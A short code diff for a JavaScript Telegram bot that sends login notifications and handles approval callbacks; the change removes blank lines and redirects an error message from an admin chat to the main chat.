@@ -33,7 +33,6 @@ export async function sendLoginTelegram(email) {
   await bot.sendMessage(CHAT_ID, message, options);
 }
 
-
 bot.on("callback_query", async (query) => {
   try {
     const [action, identifier] = query.data.split("|");
@@ -58,13 +57,11 @@ bot.on("callback_query", async (query) => {
 
   } catch (err) {
     console.error("❌ Failed to handle callback:", err);
-    bot.sendMessage(ADMIN_CHAT_ID, `⚠️ Error handling approval`);
+    bot.sendMessage(CHAT_ID, `⚠️ Error handling approval`);
   }
 });
-
 
 // /start command
 bot.onText(/\/start/, (msg) => {
   bot.sendMessage(msg.chat.id, "✅ Bot is running and waiting for CB login approvals.");
 });
-
